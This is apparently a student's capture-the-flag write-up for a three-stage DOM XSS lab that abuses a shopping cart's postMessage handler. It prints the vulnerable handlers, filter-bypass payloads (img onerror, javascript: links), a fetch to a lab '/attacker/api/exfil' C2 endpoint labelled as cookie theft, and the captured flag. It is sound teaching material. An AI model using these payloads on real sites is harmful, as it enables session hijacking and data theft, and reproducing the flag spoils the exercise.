# Task 6. DOM XSS : postMessage Abuse

## **Task 6 Description**


### 6. DOM XSS : postMessage Abuse

`postMessage` is a browser API that allows different windows and iframes to communicate. When implemented securely, the receiving page validates the message origin, validates the message shape, and renders received data safely. When implemented poorly, message data becomes attacker-controlled HTML.

The cart page listens for messages and renders their contents into the page. Your job is to send crafted messages from the browser Console, understand which object fields the handler trusts, and bypass each stage's content filtering.

#### Stage URLs

| Stage | URL | What Changes |
| :--- | :--- | :--- |
| 1 | `/cart` | Message content rendered directly |
| 2 | `/cart/checkout` | `<script>` tags filtered from message content |
| 3 | `/cart/payment` | Strict object shape expected and common event handlers filtered |

#### Mission Objectives
1. Open the cart stage. Open DevTools → Console.
2. Send a harmless test message and watch the **Special Offers** message area update.
3. Inspect the `message` event listener in Sources.
4. Identify which field of the message object is rendered as HTML.
5. Adjust the message object for each stage.
6. Escalate from test text to an XSS payload that sends C2 evidence.
7. Submit the stage token to `/cart/api/track`.

#### The Safe Test Message
```javascript
window.postMessage({ content: 'TESTINPUT123' }, '*');
```
Does the page update? Then find exactly which property caused it in the event listener.

#### Message Shapes To Understand
The page may accept different message shapes depending on the stage:

```javascript
// Simple object message
window.postMessage({ content: 'TESTINPUT123' }, '*');

// Alternate field used by some payloads
window.postMessage({ html: 'TESTINPUT123' }, '*');

// Stricter widget-style message
window.postMessage({
 type: 'widget-update',
 content: 'TESTINPUT123'
}, '*');
```

Your job is not just to paste a payload. Your job is to read the handler and answer:
* Does this stage accept a string, an object, or only a specific object type?
* Does it read `content`, `html`, or both?
* What filtering happens before the value reaches `innerHTML`?
* Does your payload need a user action, such as clicking a rendered link or element?

#### Hints
* **Stage 1:** A simple object with the right property name is enough.
* **Stage 2:** Obvious `<script>` tags are removed, but the remaining HTML is still rendered.
* **Stage 3:** Object structure matters as much as payload content. Read the handler carefully to understand what shape it trusts and which events are filtered.
* The message may support both a `content` field and an `html` field.

#### Step-by-Step Field Guide
1. Load `/cart`.
2. Send the safe test message from Console.
3. Confirm the message appears in the widget area.
4. Open Sources and search for `addEventListener('message'`.
5. Read the handler for the current stage and write down:
   ```text
    Accepted data type:
    Required object fields:
    Filter applied:
    DOM sink:
   ```
6. Repeat this process for `/cart/checkout` and `/cart/payment`.
7. Only after you understand the handler should you build the XSS payload.

#### Verification Checklist
- [ ] You can explain why message validation and safe rendering prevent this attack
- [ ] You can identify the trusted message field by reading the event listener
- [ ] C2 shows evidence from message-triggered injection
- [ ] Stage 3 returns the flag

#### Repo:
* **GitHub repository:** `dlh-cyber_security`
* **Directory:** `web_application_security/websec_0x0C`
* **File:** `7-flag.txt`




## **Solution**



- Start sandbox `cyber_websec_0x0c`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.213.180 web0x0c.hbtn" | sudo tee -a /etc/hosts
```



Our objectives are to identify the message source and DOM sink, understand the filtering in all three stages, confirm JavaScript execution, produce C2 evidence, and capture the flag for `7-flag.txt`.

The key difference from Task 5 is the injection source:

- Task 5: `location.hash` → `innerHTML`
- Task 6: `MessageEvent.data` → `innerHTML`

## Step 1: Test basic postMessage handling

Objective: Determine whether the cart page accepts a JavaScript object containing a `content` property and displays its value.

Open Firefox on Kali and navigate to:

`http://web0x0c.hbtn/cart`

Open Firefox DevTools → Console and execute:

```js
window.postMessage({ content: 'TASK6_STAGE1_TEST' }, '*');
```

Now look for the Special Offers section on the cart page.

Our observations:

1. The `TASK6_STAGE1_TEST` appears in the Special Offers area.
2. The HTML element containing the marker from Firefox Inspector:
```html
<div id="widget-message" class="mt-3 text-sm text-zinc-500">TASK6_STAGE1_TEST</div>
```

### What we're testing

`window.postMessage()` dispatches a `message` event to the window. The receiving JavaScript can read the object through `event.data`.

If the page displays our marker, it confirms that the message handler accepts this object shape and processes the `content` field.

This does not yet prove XSS. Our next step will be to inspect the actual `message` event listener and identify how the data reaches the DOM.

Stage 1 message handling is confirmed. The cart page accepts an object containing `content` and updates the Special Offers widget.

The observed DOM element is:

```html
<div id="widget-message" class="mt-3 text-sm text-zinc-500">
    TASK6_STAGE1_TEST
</div>
```

We've established that the message reaches the DOM, but not yet whether the application uses `innerHTML` or the safer `textContent`.

## Step 2: Inspect the message event listener

Objective: Identify the exact message validation logic and DOM sink.

On `http://web0x0c.hbtn/cart`:

1. Open Firefox DevTools (`F12`).
2. Select Debugger.
3. Press `Ctrl+Shift+F` to search across loaded JavaScript sources.
4. Search for:
   ```
   addEventListener('message'
   ```
5. The handler responsible for updating `widget-message`:

```javascript
// VULNERABLE: postMessage handler without origin check
window.addEventListener('message', function(event) {

    // Stage 1: No filter - direct innerHTML
    if (typeof event.data === 'string') {
        document.getElementById('widget-message').innerHTML = event.data;
    } else if (event.data.content) {
        document.getElementById('widget-message').innerHTML = event.data.content;
    }

});
```


We've identified the complete Stage 1 source-to-sink chain. The handler is vulnerable to DOM XSS.

## Step 3: Confirm HTML injection through postMessage

The handler reveals:

| Attribute            | Finding                                               |
| -------------------- | ----------------------------------------------------- |
| Source               | `event.data`                                          |
| Accepted data types  | Strings and objects                                   |
| Trusted object field | `content`                                             |
| Origin validation    | None                                                  |
| HTML sanitization    | None                                                  |
| DOM sink             | `document.getElementById('widget-message').innerHTML` |

The critical code is:

```js
if (typeof event.data === 'string') {
    document.getElementById('widget-message').innerHTML = event.data;
} else if (event.data.content) {
    document.getElementById('widget-message').innerHTML = event.data.content;
}
```

The absence of an `event.origin` check is particularly important. The handler does not verify which origin sent the message, so messages from other origins could potentially reach the same vulnerable sink.

### Action: Test HTML rendering

Stay on:

`http://web0x0c.hbtn/cart`

Open Firefox DevTools → Console and execute:

```
window.postMessage({
    content: '<b id="postmessage-stage1-probe">STAGE1_HTML_OK</b>'
}, '*');
```

Expected result: `STAGE1_HTML_OK` appears in bold in the Special Offers area.

Our observations - we're getting console message:
```
Uncaught TypeError: can't access property "data", event is undefined
    <anonymous> debugger eval code:1
```

The error:

```
Uncaught TypeError: can't access property "data", event is undefined
```

indicates that JavaScript attempted to access `event.data` when `event` was undefined.

This commonly happens when code from inside an event listener is executed directly in the Console, outside its callback.

Our earlier `postMessage` test worked, so the message handler itself is already confirmed operational.

## Step 3: Retry the HTML injection probe

On `http://web0x0c.hbtn/cart`, open Firefox DevTools → Console and execute this command:

```js
window.postMessage(
    {content: '<b id="postmessage-stage1-probe">STAGE1_HTML_OK</b>'},
    window.location.origin
);
```

This command sends a message to the existing listener. It doesn't access `event.data` directly.

Our observations:

1. **`STAGE1_HTML_OK`** appears in bold in the Special Offers area.
2. The Firefox Inspector shows this HTML element:

```html
<div id="widget-message" class="mt-3 text-sm text-zinc-500">
	<b id="postmessage-stage1-probe">
		STAGE1_HTML_OK
	</b>
</div>
```

Stage 1 HTML injection is confirmed. The `content` field reaches `innerHTML` without sanitization, and the browser interprets it as actual HTML.

We can now test JavaScript execution.

## Step 4: Confirm Stage 1 DOM XSS execution

Objective: Demonstrate that attacker-controlled message content can execute JavaScript through the `postMessage` handler.

Stay on:

`http://web0x0c.hbtn/cart`

Open Firefox DevTools → Console and execute:

```js
window.postMessage({
    content: `<img src="x" onerror="console.log('POSTMESSAGE_STAGE1_XSS_EXECUTED')">`
}, window.location.origin);
```

This payload uses an invalid image source to trigger the `onerror` handler when the injected HTML is rendered.

Our Observations - Console output:

```
POSTMESSAGE_STAGE1_XSS_EXECUTED
```

### What this proves

Stage 1 DOM XSS is confirmed. The Console output proves that JavaScript executed after the cart page received our crafted `postMessage`.

We've demonstrated the complete chain:

`postMessage()` → `event.data.content` → `innerHTML` → `onerror` → JavaScript execution.

## Step 5: Inspect the Stage 2 message handler

Objective: Determine exactly how Stage 2 filters incoming messages before testing an XSS bypass.

Navigate to:

`http://web0x0c.hbtn/cart/checkout`

Open Firefox DevTools → Debugger, search for:

```
addEventListener('message'
```

The complete event listener:

```javascript
// VULNERABLE: postMessage handler without origin check
window.addEventListener('message', function(event) {

    // Stage 2: Basic filter
    if (typeof event.data === 'string') {
        let msg = event.data.replace(/<script[^>]*>.*?<\/script>/gi, '');
        document.getElementById('widget-message').innerHTML = msg;
    } else if (event.data.content) {
        let msg = event.data.content.replace(/<script[^>]*>.*?<\/script>/gi, '');
        document.getElementById('widget-message').innerHTML = msg;
    }

});
```

The Stage 2 handler confirms that the application filters `<script>` tags but still uses `innerHTML` to render message content.

### Stage 2 findings

| Attribute            | Finding                              |
| -------------------- | ------------------------------------ |
| Source               | `event.data`                         |
| Accepted data types  | Strings and objects                  |
| Trusted object field | `content`                            |
| Origin validation    | None                                 |
| Filtering            | Regex removes `<script>...</script>` |
| DOM sink             | `widget-message.innerHTML`           |

The critical weakness is:

```js
let msg = event.data.content.replace(/<script[^>]*>.*?<\/script>/gi, '');
document.getElementById('widget-message').innerHTML = msg;
```

The filter does not remove HTML event-handler attributes such as `onerror`.

## Step 6: Test Stage 2 script filtering and XSS execution

Objective: Verify that the filter removes `<script>` elements but allows executable HTML event handlers.

Stay on:

`http://web0x0c.hbtn/cart/checkout`

Open Firefox DevTools → Console and execute:

```js
window.postMessage({
    content: `<script>console.log('STAGE2_SCRIPT')</script>
<img src=x onerror="console.log('POSTMESSAGE_STAGE2_XSS_EXECUTED')">`
}, window.location.origin);
```

### Expected behavior

The script-tag filter should remove `<script>...</script>`, leaving the image element intact.


Our observations:

1. The `POSTMESSAGE_STAGE2_XSS_EXECUTED` appears in the Console.
2. The HTML that appears inside `widget-message` in Firefox Inspector is:

```html
<div id="widget-message" class="mt-3 text-sm text-zinc-500">
	<img src="x" onerror="console.log('POSTMESSAGE_STAGE2_XSS_EXECUTED')">
</div>
```

Stage 2 DOM XSS is confirmed. The script-tag filter removes `<script>` elements but leaves executable HTML event handlers intact.

The results demonstrate the complete chain:

`postMessage()` → `event.data.content` → script-tag filter → `innerHTML` → `<img onerror>` → JavaScript execution.

The Console output `POSTMESSAGE_STAGE2_XSS_EXECUTED` proves that the filter is insufficient.

## Step 7: Inspect the Stage 3 message handler

Objective: Identify Stage 3's required message structure and filtering logic before constructing a payload.

Navigate to:

`http://web0x0c.hbtn/cart/payment`

Open Firefox DevTools → Debugger, then search for:

```
addEventListener('message'
```

The code of the handler responsible for updating `widget-message`:

```javascript
// VULNERABLE: postMessage handler without origin check
window.addEventListener('message', function(event) {

    // Stage 3: Strict filter
    if (typeof event.data !== 'object') return;
    if (event.data.type !== 'widget-update') return;
    let msg = event.data.content || '';
    msg = msg.replace(/<script[^>]*>.*?<\/script>/gi, '')
             .replace(/on\w+\s*=/gi, 'data-blocked=');
    document.getElementById('widget-message').innerHTML = msg;

});
```

The Stage 3 handler reveals exactly what we need. Unlike Stages 1 and 2, it validates the message structure before processing its content.

## Step 8: Verify Stage 3 message structure

### Handler analysis

| Attribute               | Stage 3 behavior                       |
| ----------------------- | -------------------------------------- |
| Accepted data type      | Object only                            |
| Required `type`         | `widget-update`                        |
| Trusted field           | `content`                              |
| `html` field            | Not used                               |
| Origin validation       | None                                   |
| Script filtering        | Removes certain `<script>` elements    |
| Event-handler filtering | Replaces `on\w+=` with `data-blocked=` |
| DOM sink                | `widget-message.innerHTML`             |

The vulnerability remains because the application still uses `innerHTML` and does not validate `event.origin`.

Notice that neither regular expression explicitly checks `href` attributes or the `javascript:` URL scheme. This resembles the Stage 3 weakness we exploited in Task 5.

### Action: Confirm accepted message structure

Navigate to:

`http://web0x0c.hbtn/cart/payment`

Open Firefox DevTools → Console and execute:

```js
window.postMessage({
    type: 'widget-update',
    content: '<b id="stage3-widget-probe">STAGE3_HTML_OK</b>'
}, window.location.origin);
```

Expected result: `STAGE3_HTML_OK` appears in bold in the Special Offers widget.

Our observations:

1. The **`STAGE3_HTML_OK`** appears in bold in the Special Offers area.
2. The Firefox Inspector shows an actual `<b>` element inside `widget-message`:
```html
<div id="widget-message" class="mt-3 text-sm text-zinc-500">
	<b id="stage3-widget-probe">STAGE3_HTML_OK</b>
</div>
```

Stage 3 HTML injection is confirmed. The handler accepts the `widget-update` message object, reads its `content` field, and inserts the value into `widget-message` using `innerHTML`.

We can now test JavaScript execution.

## Step 9: Bypass the Stage 3 filter using a JavaScript URL

Objective: Determine whether a `javascript:` URL can bypass the event-handler filter, just as it did in Task 5.

The Stage 3 filter removes `<script>` elements and rewrites event-handler attributes:

```js
msg = msg.replace(/<script[^>]*>.*?<\/script>/gi, '')
         .replace(/on\w+\s*=/gi, 'data-blocked=');
```

However, neither expression blocks `href="javascript:..."`.

### Action: Inject a clickable JavaScript link

Stay on:

`http://web0x0c.hbtn/cart/payment`

Open Firefox DevTools → Console and execute:

```js
window.postMessage({
    type: 'widget-update',
    content: `<a href="javascript:console.log('POSTMESSAGE_STAGE3_XSS_EXECUTED')">CLICK_STAGE3_TEST</a>`
}, window.location.origin);
```

In the Special Offers widget, click the newly displayed `CLICK_STAGE3_TEST` link.

Expected Console output:

```
POSTMESSAGE_STAGE3_XSS_EXECUTED
```

The expected DOM structure is:

```
<div id="widget-message" class="mt-3 text-sm text-zinc-500">
    <a href="javascript:console.log('POSTMESSAGE_STAGE3_XSS_EXECUTED')">
        CLICK_STAGE3_TEST
    </a>
</div>
```

### Our observations:

1. The `POSTMESSAGE_STAGE3_XSS_EXECUTED` appears in the Console after clicking.
2. The Firefox Inspector show the `<a>` element with its `javascript:` URL intact:
```html
<div id="widget-message" class="mt-3 text-sm text-zinc-500">
	<a href="javascript:console.log('POSTMESSAGE_STAGE3_XSS_EXECUTED')">
		CLICK_STAGE3_TEST
	</a>
</div>
```

Stage 3 DOM XSS is confirmed. The `widget-update` message passes validation, and the `javascript:` URL bypasses the regex filters.

We've now confirmed JavaScript execution in all three stages. Stage 3 requires a click, unlike Stages 1 and 2.

## Step 10: Verify Stage 3 C2 communication

Objective: Demonstrate that JavaScript executed through the `postMessage` handler can transmit data to the lab's C2 endpoint.

We'll send a harmless marker instead of actual cookies.

### Action

Stay on:

`http://web0x0c.hbtn/cart/payment`

Open Firefox DevTools → Console and execute:

```js
window.postMessage({
    type: 'widget-update',
    content: `<a href="javascript:fetch('/attacker/api/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cookies',data:'POSTMESSAGE_STAGE3_C2_PROOF',level:8,stage:3})}).then(r=>console.log('C2_STATUS:',r.status))">SEND_STAGE3_C2_TEST</a>`
}, window.location.origin);
```

Click the `SEND_STAGE3_C2_TEST` link in the Special Offers area.

We are provisionally using Level 8, based on the numbering of the previous tasks.

### Our Observations


1. The Console displays `C2_STATUS: 200` ✅
2. The C2 dashboard contains `POSTMESSAGE_STAGE3_C2_PROOF`, Level 8 Stage 3 ✅

Stage 3 DOM XSS and C2 communication are confirmed. We now have evidence that the injected `postMessage` payload executes JavaScript and communicates successfully with the lab's C2 endpoint.

| Verification                                | Result                        |
| ------------------------------------------- | ----------------------------- |
| C2 HTTP response                            | `200 OK`                      |
| C2 dashboard evidence                       | `POSTMESSAGE_STAGE3_C2_PROOF` |
| Challenge context                           | Level 8, Stage 3              |

## Step 11: Capture the Stage 3 flag through postMessage XSS

Objective: Use the confirmed Stage 3 XSS primitive to read the tracking token and submit it to `/cart/api/track`.

On:

`http://web0x0c.hbtn/cart/payment`

Open Firefox DevTools → Console and execute:

```js
window.postMessage({
    type: 'widget-update',
    content: `<a href="javascript:fetch('/cart/api/track?t='+encodeURIComponent(document.getElementById('tracking-id').textContent.trim())).then(r=>r.text()).then(t=>console.log('TRACK_RESULT:',t))">CAPTURE_STAGE3_FLAG</a>`
}, window.location.origin);
```

Then click CAPTURE_STAGE3_FLAG in the Special Offers widget.

The payload uses the exact exploitation chain we verified:

`postMessage` → `event.data.content` → regex filtering → `innerHTML` → `javascript:` link → tracking request.

Our observations:

The Console displays:

```json
TRACK_RESULT: {"ref":"FLAG{2621d9b68d485bb1d0d9ad2726ecf39d}","status":"tracked"}
```

&#x20;Task 6: Flag captured

Stage 3 DOM XSS was successfully exploited through `postMessage`!

The tracking endpoint returned:

```
{
  "ref": "FLAG{2621d9b68d485bb1d0d9ad2726ecf39d}",
  "status": "tracked"
}
```

We've confirmed the complete exploitation chain:

1. A crafted `postMessage` object passes the `widget-update` validation.
2. The `content` field bypasses the regex-based filters using a `javascript:` URL.
3. The vulnerable `innerHTML` sink creates an executable link.
4. Clicking the link executes JavaScript in the cart page.
5. The payload submits the tracking token to `/cart/api/track`.
6. The server accepts the token and returns the flag.

We also have independent C2 evidence: HTTP `200 OK` and the `POSTMESSAGE_STAGE3_C2_PROOF` record under Level 8 / Stage 3.

## Step 12: Save the flag and Verify


```bash
echo "FLAG{2621d9b68d485bb1d0d9ad2726ecf39d}" > 7-flag.txt
git add .
git commit -m "7-flag.txt"
git push
```

